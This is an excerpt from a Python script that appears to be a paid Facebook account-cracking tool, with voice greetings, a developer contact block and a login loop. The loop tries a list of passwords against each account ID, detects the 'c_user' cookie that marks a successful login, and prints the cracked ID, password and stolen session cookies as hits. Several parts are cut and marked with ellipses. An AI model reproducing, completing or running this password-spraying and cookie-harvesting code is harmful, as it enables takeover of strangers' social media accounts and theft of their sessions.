...
os.system('espeak -a 300 " WHAT, IS, YOUR, NAME, SARE,"')
uname =input('\033[35;1m[ \033[35;1m• \033[35;1m] \033[35;1m WHAT IS YOUR NAME \033[1;91m: \33[1;32m')
os.system('espeak -a 300 " Welcome,   to,  shaoum,  vai,  PAID,  Tools"')
...
number=int("+8801623461559")

devoloper_info={
    "Developer" :  'Shaoum molla',
    "Number" :  number,
    "Status" :  '24-ONLINE',
    "GitHub Url":  'https://github.com/shaoumv',
    "Facebook" :  'facebook.com/shaoum molla',
    }
...
def need(uid,pwx,fb,tl):
    ...
    sys.stdout.write(f"\r  \33[1;90m[\33[1;97mSHAOUM\33[1;92m | {'{:.1%}'.format(loop/int(tl))} | \33[1;97m{loop} \33[1;90m] \r "),
    sys.stdout.flush()
    try:
        for ps in pwx:
            ...
            if "c_user" in heron_brand:
                ...
                xd=xx[:15]
                print("\r\r\n\n")
                print(Panel(f"\r\r\n[red reverse] SHAOUM [🎉🥳]=UID/PAS[/red reverse] [bold green]{xd} [cyan]• [black reverse]{ps}[/black reverse] \n[yellow reverse]COOKIES=[🔶][/yellow reverse][bold rea]{coki}\n",title=f"[red reverse][TOTAL-OK {hh}]"))
                ok.append(uid)
                break
